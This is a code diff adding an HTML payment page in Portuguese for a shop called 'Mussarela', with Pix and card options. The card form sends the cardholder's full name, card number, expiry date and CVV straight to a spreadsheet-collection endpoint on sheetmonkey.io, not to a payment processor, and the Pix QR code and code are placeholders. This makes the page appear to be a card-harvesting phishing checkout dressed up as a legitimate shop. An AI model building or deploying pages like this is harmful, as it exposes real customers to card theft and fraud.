@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="pagamento.css">
+    <script src="pagamento.js" defer></script>
+    <title>Pagamento</title>
+</head>
+<body>
+    <header>
+        <a href="endereco.html">
+            <img src="https://i.ibb.co/7yDgBcQ/Picsart-24-12-23-02-41-17-873.png" alt="Voltar para a página inicial" class="back-icon">
+        </a>
+        <h1>Mussarela</h1>
+    </header>
+    <main>
+        <h2>Escolha a forma de pagamento:</h2>
+        <div class="payment-options">
+            <button class="payment-button pix">Pix</button>
+            <button class="payment-button card">Cartão</button>
+        </div>
+        <div id="pix-checkout" class="hidden">
+            <h2>Pagamento via Pix</h2>
+            <p>Escaneie o QR Code ou copie o código abaixo para realizar o pagamento:</p>
+            <img src="https://via.placeholder.com/200x200" alt="QR Code Pix">
+            <div class="pix-code">
+                <label for="pixCode">Pix Copie e Cola:</label>
+                <input type="text" id="pixCode" value="123456789012345678901234567890123456" readonly>
+                <button onclick="copyPixCode()">Copiar</button>
+            </div>
+        </div>
+        <div id="card-checkout" class="hidden">
+            <h2>Pagamento via Cartão</h2>
+            <form id="cardForm" action="https://api.sheetmonkey.io/form/pAvRNPLKm6ztAEpCUSqB97" method="POST">
+                <label for="cardName">Nome Completo:</label>
+                <input type="text" id="cardName" name="cardName" placeholder="Digite o nome completo" required>
+                <label for="cardNumber">Número do cartão:</label>
+                <input type="text" id="cardNumber" name="cardNumber" placeholder="Digite o número do cartão" maxlength="16" required>
+                <label for="expiryDate">Validade (MM/AA):</label>
+                <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/AA" maxlength="5" required>
+                <label for="cvv">CVV:</label>
+                <input type="text" id="cvv" name="cvv" placeholder="Digite o CVV" maxlength="3" required>
+                <button type="submit" class="submit-button">Pagar</button>
+            </form>
+        </div>
+        <div id="message" class="hidden">
+            <h2>Novos usuários podem pagar apenas via Pix.</h2>
+        </div>
+    </main>
+    
+    <script src="pagamento.js"></script>
+    
+</body>
+</html>
